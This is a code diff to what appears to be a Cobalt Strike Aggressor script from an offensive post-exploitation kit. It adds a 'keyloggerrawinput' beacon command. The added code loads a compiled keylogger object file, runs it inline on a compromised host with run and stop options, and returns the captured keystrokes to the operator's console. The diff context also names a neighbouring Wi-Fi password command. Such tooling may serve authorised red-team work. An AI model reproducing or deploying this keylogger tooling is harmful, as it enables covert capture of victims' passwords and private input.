@@ -1291,6 +1291,38 @@ alias wifipasswords {
 }
 
 
+beacon_command_register(
+	"keyloggerrawinput", "Keylogger based on RegisterRawInputDevices",
+	"INFO:\nFirst run: the BOF registers for raw input using RegisterRawInputDevices to start capturing keystroke into Windows internal raw-input buffer (max. 10.000 WM_INPUT messages).\nNext run: the BOF drains and processes all pending WM_INPUT messages from the raw-input buffer and print the results to the beacon console.\n\n" .
+	"ARGUMENTS:\n[<option>]: specify one of the following options: "run" (start the keylogger or collect keystroke results), or "stop" (stop the keylogger).\n\n" .
+	"USAGE:\nkeyloggerrawinput <option>\n\n" .
+	"EXAMPLES:\nkeyloggerrawinput run\nkeyloggerrawinput stop\n\n");
+	
+alias keyloggerrawinput {
+    $bid = $1;
+    $cmd = $2;
+
+    if ($cmd eq "") {
+        berror($bid, "Please specify one of the following option: run | stop\n");
+        return;
+    }
+	
+    # Read in the right BOF file
+    $handle = openf(script_resource("KIT/KeyloggerRawInput/keyloggerrawinput.o"));
+    $data   = readb($handle, -1);
+    closef($handle);
+
+    # Pack our arguments
+    $arg_data  = bof_pack($bid, "z", $cmd);
+
+    blog($bid, "Starting keylogger..");
+    beacon_inline_execute($bid, $data, "go", $arg_data);
+}
+
+
+
+
+
 
 
 
